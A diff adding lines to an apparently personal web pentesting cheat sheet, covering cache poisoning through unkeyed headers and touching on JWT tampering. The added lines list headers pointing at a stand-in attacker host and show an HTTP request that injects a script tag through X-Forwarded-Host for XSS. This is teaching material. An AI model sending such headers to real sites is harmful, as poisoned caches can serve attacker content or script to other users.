@@ -1403,6 +1403,16 @@ dig the request to know hidden headers lead to cache posining attack
 can put 
 Pragma: x-get-cache-key	==> to display cache key in response
 
+Headers That Can Be Used To Cache :
+X-Forwarded-Host: hackers-site.com
+X-Host: hackers-site.com
+Forwarded-Server: hackers-site.com
+For Xss we can replace \: with X-Forwarded-Host
+GET /images/info/img?id=123 HTTP/1.1
+Host: Example.com
+User-Agent: Mozilla/....
+X-Forwarded-Host: <script>alert(1)</script>
+
 --------------------------------------------------------------------------------------------------
 JWT
 1- change user role or id in jwt 
